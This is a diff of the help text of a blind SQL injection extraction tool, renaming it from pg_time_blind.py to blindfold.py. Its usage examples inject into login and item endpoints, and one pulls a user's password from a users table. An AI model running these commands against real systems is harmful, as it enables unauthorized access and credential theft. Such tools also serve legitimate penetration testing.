@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-pg_time_blind.py - Structured, multi-DBMS blind SQL injection extractor.
+blindfold.py - Structured, multi-DBMS blind SQL injection extractor (formerly pg-time-blind).
 
 Despite the historical name, this tool now handles several DBMS and three blind
 techniques, choosing automatically:
@@ -35,16 +35,16 @@ No sqlmap. Only `requests` is required.
 ----------------------------------------------------------------------
 EXAMPLES
   # fully automatic (detect context, DBMS, technique, then extract)
-  python3 pg_time_blind.py -u http://t:3000/login \
+  python3 blindfold.py -u http://t:3000/login \
       -d "username=INJECT&password=test" \
       --query "SELECT password FROM users WHERE username='antwon'"
 
   # reuse a Burp request, force MySQL, allow risky OR contexts
-  python3 pg_time_blind.py --request req.txt --dbms mysql --allow-or \
+  python3 blindfold.py --request req.txt --dbms mysql --allow-or \
       --query "SELECT current_user()"
 
   # speed up boolean extraction with 8 workers
-  python3 pg_time_blind.py -u "http://t/item?id=INJECT" --threads 8 \
+  python3 blindfold.py -u "http://t/item?id=INJECT" --threads 8 \
       --query "SELECT version()"
 ----------------------------------------------------------------------
 """
